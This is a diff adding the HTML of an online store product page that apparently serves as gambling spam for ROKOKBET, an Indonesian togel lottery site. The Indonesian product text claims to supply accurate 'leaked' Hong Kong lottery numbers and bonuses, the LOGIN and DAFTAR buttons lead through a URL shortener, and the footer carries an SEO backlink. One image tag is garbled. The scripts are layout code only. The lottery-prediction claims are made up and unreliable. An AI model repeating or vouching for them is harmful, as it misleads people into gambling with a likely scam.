+              <!-- Burger -->
+              <div class="header-burger
+
+    menu-overlay-does-not-have-visible-non-navigation-items
+
+
+    
+    no-actions
+    
+  " data-animation-role="header-element">
+                <button class="header-burger-btn burger" data-test="header-burger">
+                  <span hidden class="js-header-burger-open-title visually-hidden">Open Menu</span>
+                  <span hidden class="js-header-burger-close-title visually-hidden">Close Menu</span>
+                  <div class="burger-box">
+                    <div class="burger-inner header-menu-icon-doubleLineHamburger">
+                      <div class="top-bun"></div>
+                      <div class="patty"></div>
+                      <div class="bottom-bun"></div>
+                    </div>
+                  </div>
+                </button>
+              </div>
+
+
+              <!-- Title and nav wrapper -->
+              <div class="header-title-nav-wrapper">
+
+
+
+
+
+
+                <!-- Nav -->
+                <div class="header-nav">
+                  <div class="header-nav-wrapper">
+                    <nav class="header-nav-list">
+
+
+
+
+                      <div class="header-nav-item header-nav-item--collection header-nav-item--active">
+                        <a href="#" data-animation-role="header-element" aria-current="page">
+                          Store
+                        </a>
+                      </div>
+
+
+
+
+
+
+                      <div class="header-nav-item header-nav-item--collection">
+                        <a href="#" data-animation-role="header-element">
+                          All Prints
+                        </a>
+                      </div>
+
+
+
+
+
+
+                      <div class="header-nav-item header-nav-item--collection">
+                        <a href="#" data-animation-role="header-element">
+                          About
+                        </a>
+                      </div>
+
+
+
+
+
+
+                    </nav>
+                  </div>
+                </div>
+
+
+                <!-- Title -->
+
+                <div class="
+                        header-title
+                        
+                      " data-animation-role="header-element">
+
+                  <div class="header-title-logo">
+                    <a href="/" data-animation-role="header-element">
+
+                      <img elementtiming="nbf-header-logo-desktop"
+                        src="https://res.cloudinary.com/dqkin28uq/image/upload/v1728160488/rokokbet-logo_0_odxbog.png"async" alt="ROKOKBET # Link Prediksi Togel HK Akurat & Syair HK Jitu Dan Bocoran HK Hari Ini" src="https://res.cloudinary.com/dqkin28uq/image/upload/v1728160488/rokokbet-logo_0_odxbog.png" class="i-amphtml-fill-content i-amphtml-replaced-content" i-amphtml-auto-lightbox-visited="">"
+                        alt="ROKOKBET" style="display:block" fetchpriority="high" loading="eager" decoding="async"
+                        data-loader="raw">
+
+                    </a>
+                  </div>
+
+
+
+                </div>
+
+
+
+              </div>
+
+
+              <!-- Actions -->
+              <div class="header-actions header-actions--right">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                <div class="showOnMobile">
+
+
+
+
+
+
+                  <div class="header-actions-action header-actions-action--cart">
+                    <a href="#"
+                      class="cart-style-icon icon--stroke icon--fill icon--cart sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline">
+                      <span class="Cart-inner">
+
+
+
+
+                        <svg class="icon icon--cart" width="61" height="49" viewBox="0 0 61 49">
+                          <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M0.5 2C0.5 1.17157 1.17157 0.5 2 0.5H13.6362C14.3878 0.5 15.0234 1.05632 15.123 1.80135L16.431 11.5916H59C59.5122 11.5916 59.989 11.8529 60.2645 12.2847C60.54 12.7165 60.5762 13.2591 60.3604 13.7236L50.182 35.632C49.9361 36.1614 49.4054 36.5 48.8217 36.5H18.0453C17.2937 36.5 16.6581 35.9437 16.5585 35.1987L12.3233 3.5H2C1.17157 3.5 0.5 2.82843 0.5 2ZM16.8319 14.5916L19.3582 33.5H47.8646L56.6491 14.5916H16.8319Z" />
+                          <path d="M18.589 35H49.7083L60 13H16L18.589 35Z" />
+                          <path
+                            d="M21 49C23.2091 49 25 47.2091 25 45C25 42.7909 23.2091 41 21 41C18.7909 41 17 42.7909 17 45C17 47.2091 18.7909 49 21 49Z" />
+                          <path
+                            d="M45 49C47.2091 49 49 47.2091 49 45C49 42.7909 47.2091 41 45 41C42.7909 41 41 42.7909 41 45C41 47.2091 42.7909 49 45 49Z" />
+                        </svg>
+
+                        <div class="icon-cart-quantity">
+
+                          <span class="cart-quantity-container">
+
+                            <span class="sqs-cart-quantity">0</span>
+
+                          </span>
+
+                        </div>
+                      </span>
+                    </a>
+                  </div>
+
+
+
+
+
+
+                </div>
+
+
+                <div class="showOnDesktop">
+
+
+
+
+
+
+                  <div class="header-actions-action header-actions-action--cart">
+                    <a href="#"
+                      class="cart-style-icon icon--stroke icon--fill icon--cart sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline">
+                      <span class="Cart-inner">
+
+
+
+
+                        <svg class="icon icon--cart" width="61" height="49" viewBox="0 0 61 49">
+                          <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M0.5 2C0.5 1.17157 1.17157 0.5 2 0.5H13.6362C14.3878 0.5 15.0234 1.05632 15.123 1.80135L16.431 11.5916H59C59.5122 11.5916 59.989 11.8529 60.2645 12.2847C60.54 12.7165 60.5762 13.2591 60.3604 13.7236L50.182 35.632C49.9361 36.1614 49.4054 36.5 48.8217 36.5H18.0453C17.2937 36.5 16.6581 35.9437 16.5585 35.1987L12.3233 3.5H2C1.17157 3.5 0.5 2.82843 0.5 2ZM16.8319 14.5916L19.3582 33.5H47.8646L56.6491 14.5916H16.8319Z" />
+                          <path d="M18.589 35H49.7083L60 13H16L18.589 35Z" />
+                          <path
+                            d="M21 49C23.2091 49 25 47.2091 25 45C25 42.7909 23.2091 41 21 41C18.7909 41 17 42.7909 17 45C17 47.2091 18.7909 49 21 49Z" />
+                          <path
+                            d="M45 49C47.2091 49 49 47.2091 49 45C49 42.7909 47.2091 41 45 41C42.7909 41 41 42.7909 41 45C41 47.2091 42.7909 49 45 49Z" />
+                        </svg>
+
+                        <div class="icon-cart-quantity">
+
+                          <span class="cart-quantity-container">
+
+                            <span class="sqs-cart-quantity">0</span>
+
+                          </span>
+
+                        </div>
+                      </span>
+                    </a>
+                  </div>
+
+
+
+
+
+
+                </div>
+
+
+              </div>
+
+
+
+            </div>
+          </div>
+        </div>
+        <!-- (Mobile) Menu Navigation -->
+        <div class="header-menu header-menu--folder-list
+        
+        
+        
+        
+        
+        " data-section-theme="" data-current-styles="{
+                                                              &quot;layout&quot;: &quot;brandingCenter&quot;,
+                                                              &quot;action&quot;: {
+                                                                &quot;buttonText&quot;: &quot;Get Started&quot;,
+                                                                &quot;newWindow&quot;: false
+                                                              },
+                                                              &quot;showSocial&quot;: false,
+                                                              &quot;socialOptions&quot;: {
+                                                                &quot;socialBorderShape&quot;: &quot;none&quot;,
+                                                                &quot;socialBorderStyle&quot;: &quot;outline&quot;,
+                                                                &quot;socialBorderThickness&quot;: {
+                                                                  &quot;unit&quot;: &quot;px&quot;,
+                                                                  &quot;value&quot;: 1.0
+                                                                }
+                                                              },
+                                                              &quot;menuOverlayAnimation&quot;: &quot;fade&quot;,
+                                                              &quot;cartStyle&quot;: &quot;cart&quot;,
+                                                              &quot;cartText&quot;: &quot;Cart&quot;,
+                                                              &quot;showEmptyCartState&quot;: true,
+                                                              &quot;cartOptions&quot;: {
+                                                                &quot;iconType&quot;: &quot;solid-7&quot;,
+                                                                &quot;cartBorderShape&quot;: &quot;none&quot;,
+                                                                &quot;cartBorderStyle&quot;: &quot;outline&quot;,
+                                                                &quot;cartBorderThickness&quot;: {
+                                                                  &quot;unit&quot;: &quot;px&quot;,
+                                                                  &quot;value&quot;: 1.0
+                                                                }
+                                                              },
+                                                              &quot;showButton&quot;: false,
+                                                              &quot;showCart&quot;: true,
+                                                              &quot;showAccountLogin&quot;: false,
+                                                              &quot;headerStyle&quot;: &quot;dynamic&quot;,
+                                                              &quot;languagePicker&quot;: {
+                                                                &quot;enabled&quot;: false,
+                                                                &quot;iconEnabled&quot;: false,
+                                                                &quot;iconType&quot;: &quot;globe&quot;,
+                                                                &quot;flagShape&quot;: &quot;shiny&quot;,
+                                                                &quot;languageFlags&quot;: [ ]
+                                                              },
+                                                              &quot;mobileOptions&quot;: {
+                                                                &quot;layout&quot;: &quot;logoCenterNavLeft&quot;,
+                                                                &quot;menuIcon&quot;: &quot;doubleLineHamburger&quot;,
+                                                                &quot;menuIconOptions&quot;: {
+                                                                  &quot;style&quot;: &quot;doubleLineHamburger&quot;,
+                                                                  &quot;thickness&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 1.0}
+                                                                }
+                                                              },
+                                                              &quot;dynamicOptions&quot;: {
+                                                                &quot;border&quot;: {
+                                                                  &quot;enabled&quot;: false,
+                                                                  &quot;position&quot;: &quot;allSides&quot;,
+                                                                  &quot;thickness&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 4.0
+                                                                  },
+                                                                  &quot;color&quot;: {
+                                                                    &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                    &quot;sitePaletteColor&quot;: {
+                                                                      &quot;colorName&quot;: &quot;black&quot;,&quot;alphaModifier&quot;: 1.0
+                                                                    }
+                                                                  }
+                                                                }
+                                                              },
+                                                              &quot;solidOptions&quot;: {
+                                                                &quot;headerOpacity&quot;: {
+                                                                  &quot;unit&quot;: &quot;%&quot;,
+                                                                  &quot;value&quot;: 100.0
+                                                                },
+                                                                &quot;border&quot;: {
+                                                                  &quot;enabled&quot;: false,
+                                                                  &quot;position&quot;: &quot;allSides&quot;,
+                                                                  &quot;thickness&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 4.0
+                                                                  },
+                                                                  &quot;color&quot;: {
+                                                                    &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                    &quot;sitePaletteColor&quot;: {
+                                                                      &quot;colorName&quot;: &quot;black&quot;,
+                                                                      &quot;alphaModifier&quot;: 1.0
+                                                                    }
+                                                                  }
+                                                                },
+                                                                &quot;dropShadow&quot;: {
+                                                                  &quot;enabled&quot;: false,
+                                                                  &quot;blur&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 30.0
+                                                                  },
+                                                                  &quot;spread&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 0.0
+                                                                  },
+                                                                  &quot;distance&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 0.0
+                                                                  },
+                                                                  &quot;color&quot;: {
+                                                                    &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                    &quot;sitePaletteColor&quot;: {
+                                                                      &quot;colorName&quot;: &quot;black&quot;,
+                                                                      &quot;alphaModifier&quot;: 1.0
+                                                                    }
+                                                                  }
+                                                                },
+                                                                &quot;blurBackground&quot;: {
+                                                                  &quot;enabled&quot;: false,
+                                                                  &quot;blurRadius&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 12.0
+                                                                  }
+                                                                },
+                                                                &quot;backgroundColor&quot;: {
+                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                  &quot;sitePaletteColor&quot;: {
+                                                                    &quot;colorName&quot;: &quot;white&quot;,
+                                                                    &quot;alphaModifier&quot;: 1.0
+                                                                  }
+                                                                },
+                                                                &quot;navigationColor&quot;: {
+                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                  &quot;sitePaletteColor&quot;: {
+                                                                    &quot;colorName&quot;: &quot;black&quot;,
+                                                                    &quot;alphaModifier&quot;: 1.0
+                                                                  }
+                                                                }
+                                                              },
+                                                              &quot;gradientOptions&quot;: {
+                                                                &quot;gradientType&quot;: &quot;faded&quot;,
+                                                                &quot;headerOpacity&quot;: {
+                                                                  &quot;unit&quot;: &quot;%&quot;,
+                                                                  &quot;value&quot;: 90.0
+                                                                },
+                                                                &quot;border&quot;: {
+                                                                  &quot;enabled&quot;: false,
+                                                                  &quot;position&quot;: &quot;allSides&quot;,&quot;thickness&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 4.0
+                                                                  },
+                                                                  &quot;color&quot;: {
+                                                                    &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                    &quot;sitePaletteColor&quot;: {
+                                                                      &quot;colorName&quot;: &quot;black&quot;,
+                                                                      &quot;alphaModifier&quot;: 1.0
+                                                                    }
+                                                                  }
+                                                                },
+                                                                &quot;dropShadow&quot;: {
+                                                                  &quot;enabled&quot;: false,
+                                                                  &quot;blur&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 30.0},
+                                                                  &quot;spread&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 0.0
+                                                                  },
+                                                                  &quot;distance&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 0.0
+                                                                  },
+                                                                  &quot;color&quot;: {
+                                                                    &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                    &quot;sitePaletteColor&quot;: {
+                                                                      &quot;colorName&quot;: &quot;black&quot;,
+                                                                      &quot;alphaModifier&quot;: 1.0
+                                                                    }
+                                                                  }
+                                                                },
+                                                                &quot;blurBackground&quot;: {
+                                                                  &quot;enabled&quot;: false,
+                                                                  &quot;blurRadius&quot;: {
+                                                                    &quot;unit&quot;: &quot;px&quot;,
+                                                                    &quot;value&quot;: 12.0
+                                                                  }
+                                                                },
+                                                                &quot;backgroundColor&quot;: {
+                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                  &quot;sitePaletteColor&quot;: {
+                                                                    &quot;colorName&quot;: &quot;white&quot;,
+                                                                    &quot;alphaModifier&quot;: 1.0
+                                                                  }
+                                                                },
+                                                                &quot;navigationColor&quot;: {
+                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                  &quot;sitePaletteColor&quot;: {
+                                                                    &quot;colorName&quot;: &quot;black&quot;,
+                                                                    &quot;alphaModifier&quot;: 1.0
+                                                                  }
+                                                                }
+                                                              },
+                                                              &quot;dropShadowOptions&quot;: {
+                                                                &quot;enabled&quot;: false,
+                                                                &quot;blur&quot;: {
+                                                                  &quot;unit&quot;: &quot;px&quot;,
+                                                                  &quot;value&quot;: 12.0
+                                                                },
+                                                                &quot;spread&quot;: {
+                                                                  &quot;unit&quot;: &quot;px&quot;,
+                                                                  &quot;value&quot;: 0.0
+                                                                },
+                                                                &quot;distance&quot;: {
+                                                                  &quot;unit&quot;: &quot;px&quot;,
+                                                                  &quot;value&quot;: 12.0
+                                                                }
+                                                              },
+                                                              &quot;borderOptions&quot;: {
+                                                                &quot;enabled&quot;: false,
+                                                                &quot;position&quot;: &quot;allSides&quot;,
+                                                                &quot;thickness&quot;: {
+                                                                  &quot;unit&quot;: &quot;px&quot;,
+                                                                  &quot;value&quot;: 4.0
+                                                                },
+                                                                &quot;color&quot;: {
+                                                                  &quot;type&quot;: &quot;SITE_PALETTE_COLOR&quot;,
+                                                                  &quot;sitePaletteColor&quot;: {
+                                                                    &quot;colorName&quot;: &quot;black&quot;,
+                                                                    &quot;alphaModifier&quot;: 1.0
+                                                                  }
+                                                                }
+                                                              },
+                                                              &quot;showPromotedElement&quot;: false,
+                                                              &quot;buttonVariant&quot;: &quot;primary&quot;,
+                                                              &quot;blurBackground&quot;: {
+                                                                &quot;enabled&quot;: false,
+                                                                &quot;blurRadius&quot;: {
+                                                                  &quot;unit&quot;: &quot;px&quot;,
+                                                                  &quot;value&quot;: 12.0
+                                                                }
+                                                              },
+                                                              &quot;headerOpacity&quot;: {
+                                                                &quot;unit&quot;: &quot;%&quot;,
+                                                                &quot;value&quot;: 100.0
+                                                              }
+                                                            }" data-section-id="overlay-nav"
+          data-show-account-login="false" data-test="header-menu">
+          <div class="header-menu-bg theme-bg--primary"></div>
+          <div class="header-menu-nav">
+            <nav class="header-menu-nav-list">
+              <div data-folder="root" class="header-menu-nav-folder">
+                <div class="header-menu-nav-folder-content">
+                  <!-- Menu Navigation -->
+                  <div class="header-menu-nav-wrapper">
+
+
+
+
+
+                    <div
+                      class="container header-menu-nav-item header-menu-nav-item--collection header-menu-nav-item--active">
+                      <a href="/store" aria-current="page">
+                        <div class="header-menu-nav-item-content">
+                          Store
+                        </div>
+                      </a>
+                    </div>
+
+
+
+
+
+
+
+                    <div class="container header-menu-nav-item header-menu-nav-item--collection">
+                      <a href="/all-prints">
+                        <div class="header-menu-nav-item-content">All Prints
+                        </div>
+                      </a>
+                    </div>
+
+
+
+
+
+
+
+                    <div class="container header-menu-nav-item header-menu-nav-item--collection">
+                      <a href="/about">
+                        <div class="header-menu-nav-item-content">
+                          About
+                        </div>
+                      </a>
+                    </div>
+
+
+
+
+                  </div>
+
+
+                </div>
+
+
+
+              </div>
+            </nav>
+          </div>
+        </div>
+      </header>
+        
+
+
+
+
+
+      <main id="page" class="container" role="main">
+
+
+        <article class="sections" id="sections" data-page-sections="65fd0fc2aa1d0858f5af2fe5">
+
+
+
+
+
+
+
+
+
+          <section data-test="page-section" data-section-theme="" class='page-section 
+      
+        content-collection
+        full-bleed-section
+        collection-type-products
+      
+      background-width--full-bleed
+      
+        section-height--medium
+      
+      
+        content-width--wide
+      
+      horizontal-alignment--center
+      vertical-alignment--middle
+      
+        
+      
+      
+      ' data-section-id="65fd10856774354aafe184c6" data-controller="SectionWrapperController" data-current-styles="{
+                                                              &quot;imageOverlayOpacity&quot;: 0.15,
+                                                              &quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
+                                                              &quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
+                                                              &quot;customSectionHeight&quot;: 10,
+                                                              &quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
+                                                              &quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
+                                                              &quot;contentWidth&quot;: &quot;content-width--wide&quot;,
+                                                              &quot;customContentWidth&quot;: 50,
+                                                              &quot;backgroundColor&quot;: &quot;&quot;,
+                                                              &quot;sectionTheme&quot;: &quot;&quot;,
+                                                              &quot;sectionAnimation&quot;: &quot;none&quot;,
+                                                              &quot;backgroundMode&quot;: &quot;image&quot;
+                                                            }" data-current-context="{
+                                                              &quot;video&quot;: null,
+                                                              &quot;backgroundImageId&quot;: null,
+                                                              &quot;backgroundMediaEffect&quot;: null,
+                                                              &quot;divider&quot;: null,
+                                                              &quot;typeName&quot;: &quot;products&quot;
+                                                            }" data-animation="none">
+            <div class="section-border">
+              <div class="section-background">
+
+
+
+              </div>
+            </div>
+            <div class='content-wrapper' style='
+        
+        
+      '>
+              <div class="content">
+
+                <div class="n-columns-2">
+                  <a href="https://preciseurl.org/Chip" rel="nofollow noreferrer" class="login">LOGIN</a>
+                  <a href="https://preciseurl.org/Chip" rel="nofollow noreferrer" class="register">DAFTAR</a>
+                  </div>
+
+
+
+
+
+                <section id="pdp" class="
+      products
+      collection-content-wrapper
+      product-layout-side-by-side
+    ">
+
+
+
+
+
+
+
+
+                  <article
+                    class="ProductItem hentry tag-togel-online tag-situs-toto tag-toto-togel author-situs-toto-togel-4D post-type-store-item"
+                    data-item-id="65fd0fc7db01f63c712f258e">
+
+                    <nav class="ProductItem-nav">
+                      <div class="ProductItem-nav-breadcrumb" data-animation-role="content">
+                        <a href="/store" class="ProductItem-nav-breadcrumb-link">Store</a>
+                        <span class="ProductItem-nav-breadcrumb-separator"></span>
+                        <a href="/store/p/zeus" class="ProductItem-nav-breadcrumb-link">ROKOKBET # Link Prediksi Togel HK Akurat & Syair HK Jitu Dan Bocoran HK Hari Ini</a>
+                      </div>
+
+
+
+                    </nav>
+
+
+                    <section class="ProductItem-summary" data-controller="ProductGallery">
+                      <section aria-label="Gallery" class="ProductItem-gallery" data-product-gallery="container">
+
+
+                        <div class="ProductItem-gallery-slides" data-animation-role="image" data-product-gallery="slides">
+
+
+
+                          <div class="ProductItem-gallery-slides-item" data-slide-index="1"
+                            data-image-id=65fd0fd62438744c9a05c86b data-controller="ImageZoom" data-slide-url="zeus"
+                            data-product-gallery="slides-item" data-test="pdp-gallery-slide">
+                            <img aria-describedby="ProductItem-gallery-slides-item-1-index-65fd0fd62438744c9a05c86b"
+                              class="ProductItem-gallery-slides-item-1" data-load="false"
+                              data-src="https://res.cloudinary.com/dqkin28uq/image/upload/v1731518613/Untitled-1_o1bmkf.jpg"
+                              data-image="https://res.cloudinary.com/dqkin28uq/image/upload/v1731518613/Untitled-1_o1bmkf.jpg"
+                              data-image-dimensions="840x480" data-image-focal-point="0.5,0.5" alt="ROKOKBET"
+                              elementtiming="nbf-products-gallery" />
+                            <span id="ProductItem-gallery-slides-item-1-index-65fd0fd62438744c9a05c86b"
+                              style="display: none;">
+                              Image 1 of
+                            </span>
+                            <div class="product-image-zoom-duplicate" aria-hidden="true">
+                              <img data-load="false"
+                                data-src="https://res.cloudinary.com/dqkin28uq/image/upload/v1731518613/Untitled-1_o1bmkf.jpg"
+                                data-image="https://res.cloudinary.com/dqkin28uq/image/upload/v1731518613/Untitled-1_o1bmkf.jpg"
+                                data-image-dimensions="840x480" data-image-focal-point="0.5,0.5" alt="ROKOKBET"
+                                elementtiming="nbf-products-gallery-zoom" />
+                            </div>
+                          </div>
+
+
+
+                          <div class="gallery-lightbox-outer-wrapper" data-use-image-loader="true"
+                            data-controller="Lightbox">
+                            <div class="gallery-lightbox " data-section-theme="">
+                              <div class="gallery-lightbox-background"></div>
+
+                              <div class="gallery-lightbox-header">
+                                <button class="gallery-lightbox-close-btn" aria-label="Close" data-close
+                                  data-test="gallery-lightbox-close">
+                                  <div class="gallery-lightbox-close-btn-icon">
+                                    <svg viewBox="0 0 40 40">
+                                      <path d="M4.3,35.7L35.7,4.3" />
+                                      <path d="M4.3,4.3l31.4,31.4" />
+                                    </svg>
+                                  </div>
+                                </button>
+                              </div>
+
+
+                              <div class="gallery-lightbox-wrapper">
+                                <div class="gallery-lightbox-list">
+
+                                  <figure class="gallery-lightbox-item" data-slide-url="zeus">
+                                    <div class="gallery-lightbox-item-wrapper">
+                                      <div class="gallery-lightbox-item-src">
+                                        <div class="gallery-lightbox-item-img content-fit">
+                                          <img
+                                            data-src="https://res.cloudinary.com/dqkin28uq/image/upload/v1731518613/Untitled-1_o1bmkf.jpg"
+                                            data-image="https://res.cloudinary.com/dqkin28uq/image/upload/v1731518613/Untitled-1_o1bmkf.jpg"
+                                            data-image-dimensions="840x480" data-image-focal-point="0.5,0.5"
+                                            alt="ROKOKBET" data-load="false" elementtiming="nbf-product-lightbox" /></div>
+                                      </div>
+                                    </div>
+                                  </figure>
+
+                                </div>
+
+                                <div class="gallery-lightbox-controls" data-test="gallery-lightbox-controls">
+                                  <div class="gallery-lightbox-control" data-previous
+                                    data-test="gallery-lightbox-control-previous">
+                                    <button class="gallery-lightbox-control-btn" aria-label="Previous Slide">
+                                      <div class="gallery-lightbox-control-btn-icon">
+                                        <svg class="caret-left-icon--small" viewBox="0 0 9 16">
+                                          <polyline fill="none" stroke-miterlimit="10" points="7.3,14.7 2.5,8 7.3,1.2 " />
+                                        </svg>
+                                      </div>
+                                    </button>
+                                  </div>
+                                  <div class="gallery-lightbox-control" data-next
+                                    data-test="gallery-lightbox-control-next">
+                                    <button class="gallery-lightbox-control-btn" aria-label="Next Slide">
+                                      <div class="gallery-lightbox-control-btn-icon">
+                                        <svg class="caret-right-icon--small" viewBox="0 0 9 16">
+                                          <polyline fill="none" stroke-miterlimit="10"
+                                            points="1.6,1.2 6.5,7.9 1.6,14.7 " />
+                                        </svg>
+                                      </div>
+                                    </button>
+                                  </div>
+                                </div>
+
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+
+                      </section>
+
+                      <section class="
+      product-details
+      ProductItem-details
+    " data-test="pdp-details">
+                        <h1 class="ProductItem-details-title" data-content-field="title" data-test="pdp-title">
+                          ROKOKBET # Link Prediksi Togel HK Akurat & Syair HK Jitu Dan Bocoran HK Hari Ini
+                        </h1>
+                        <div data-controller="ProductItemVariants,ProductCartButton" class="ProductItem-details-checkout">
+
+                          <div class="ProductItem-product-price" data-animation-role="content">
+
+
+
+                            <div class="product-price">
+                              IDR 10.000.000
+                            </div>
+
+
+
+                            <div data-afterpay="true" data-current-context="{
+                                                              &quot;65fd0fc7db01f63c712f258e&quot;: {
+                                                                &quot;scarcityEnabled&quot;: false,
+                                                                &quot;scarcityShownByDefault&quot;: false,
+                                                                &quot;afterPayAvailable&quot;: false,
+                                                                &quot;klarnaAvailable&quot;: false,
+                                                                &quot;shopperLanguage&quot;: &quot;en&quot;,
+                                                                &quot;afterPayMin&quot;: 0,
+                                                                &quot;afterPayMax&quot;: 0,
+                                                                &quot;klarnaMin&quot;: 0,
+                                                                &quot;klarnaMax&quot;: 0,
+                                                                &quot;mailingListSignUpEnabled&quot;: false,
+                                                                &quot;mailingListOptInByDefault&quot;: false
+                                                              }
+                                                            }"></div>
+                            <div class="pdp-overlay"></div>
+
+                          </div>
+
+                          <div class="ProductItem-details-excerpt" data-content-field="excerpt">
+                            <p>Prediksi ROKOKBET adalah penyedia bocoran angka hk dan syair angka hk yang sangat jitu dan akurat dalam menyediakan 2D 3D 4D yang terlengkap di setiap pasaran togelnya. Jadi tidak perlu lama lagi kenapa anda sangat susah sekali untuk bisa mendapatkan hadiah tersebut.</p>
+<p>Ini harus anda jadikan sebagai bahan utama ketika mau memulai permainan dan perlombaan togel tersebut karena di dalam fitur ini berisi tentang bocoran bocoran angka yang akan keluar nantinya di pasaran togelnya.</p>
+<p>Tidak perlu menunggu waktu lama lagi karena anda harus segera mencoba yang satu ini karena ini adalah salah satu kunci utama untuk anda ketika nantinya mau memenangkan perlombaan togel tersebut. Dan jangan lupa juga untuk mengajak teman anda bermain dan bergabung ke dalam situs ROKOKBET.</p>
+<p>Yang di mana nantinya sudah kami sediakan hadiah dan bonus sebesar 10% untuk bisa anda dapatkan dan di klaim melalui fitur live chat yang sudah kami sediakan untuk bisa anda bertanya tanya tentang info perlombaan selanjutnya.</p>
+<p><strong>Kesimpulan&nbsp;</strong></p>
+<p>Bagaimana dapat anda simpulkan bahwa apa yang kami beritahu adalah yang sangat penting untuk anda mengerti dan untuk anda pahami. Jadi tidak ada alasan lagi nantinya untuk anda berfikir tentang bagaimana situs ROKOKBET menjadi situs yang paling terbaik dari situs lainnya.</p>
+
+                          <div class="product-quantity-input" data-item-id="65fd0fc7db01f63c712f258e"
+                            data-animation-role="content">
+                            <div class="quantity-label">Quantity:</div>
+                            <input aria-label="Quantity" size="4" max="9999" min="1" value="1" type="number"
+                              step="1"></input>
+                          </div>
+
+                          <div class="sqs-add-to-cart-button-wrapper" data-animation-role="button">
+                            <a><div
+                              class="sqs-add-to-cart-button sqs-suppress-edit-mode sqs-editable-button sqs-button-element--primary "
+                              role="button" tabindex="0" data-dynamic-strings
+                              data-collection-id="65fd0fc2aa1d0858f5af2fe4" data-item-id="65fd0fc7db01f63c712f258e"
+                              data-product-type="1" data-use-custom-label="false" data-original-label="Add To Cart">
+                              <div class="sqs-add-to-cart-button-inner">Add To Cart</div>
+                            </div></a>
+                          </div>
+
+                        </div>
+                      </section>
+
+                    </section>
+                  </article>
+                </section>
+              </div>
+
+            </div>
+          </section>
+        </article>
+      </main>
+      <script type="text/javascript">
+        const firstSection = document.querySelector('.page-section');
+        const header = document.querySelector('.header');
+        const mobileOverlayNav = document.querySelector('.header-menu');
+        const sectionBackground = firstSection ? firstSection.querySelector('.section-background') : null;
+        const headerHeight = header ? header.getBoundingClientRect().height : 0;
+        const firstSectionHasBackground = firstSection ? firstSection.className.indexOf('has-background') >= 0 : false;
+        const isFirstSectionInset = firstSection ? firstSection.className.indexOf('background-width--inset') >= 0 : false;
+        const isLayoutEngineSection = firstSection ? firstSection.className.indexOf('layout-engine-section') >= 0 : false;
+
+        if (firstSection) {
+          firstSection.style.paddingTop = headerHeight + 'px';
+        }
+        if (sectionBackground && isLayoutEngineSection) {
+          if (isFirstSectionInset) {
+            sectionBackground.style.top = headerHeight + 'px';
+          } else {
+            sectionBackground.style.top = '';
+          }
+        }
+        //# sourceURL=headerPositioning.js
+      </script>
+
+
+      <footer class="sections" id="footer-sections" data-footer-sections>
+  <small class="copyright__content"><a href="https://soonews.ca/" title="ROKOKBET">SEOSUMANTO2024 ROKOKBET</a></small>
+      </footer>
+
+
+    </div>
+
+    <script defer="defer"
+      src="https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/scripts/site-bundle.6c05f1e49429ba1d8919cf9e9cce7b3f.js"
+      type="text/javascript"></script>
+    <svg xmlns="http://www.w3.org/2000/svg" version="1.1" style="display:none" data-usage="social-icons-svg">
+      <symbol id="facebook-icon" viewBox="0 0 64 64">
+        <path
+          d="M34.1,47V33.3h4.6l0.7-5.3h-5.3v-3.4c0-1.5,0.4-2.6,2.6-2.6l2.8,0v-4.8c-0.5-0.1-2.2-0.2-4.1-0.2 c-4.1,0-6.9,2.5-6.9,7V28H24v5.3h4.6V47H34.1z" />
+      </symbol>
+      <symbol id="facebook-mask" viewBox="0 0 64 64">
+        <path
+          d="M0,0v64h64V0H0z M39.6,22l-2.8,0c-2.2,0-2.6,1.1-2.6,2.6V28h5.3l-0.7,5.3h-4.6V47h-5.5V33.3H24V28h4.6V24 c0-4.6,2.8-7,6.9-7c2,0,3.6,0.1,4.1,0.2V22z" />
+      </symbol>
+      <symbol id="instagram-icon" viewBox="0 0 64 64">
+        <path
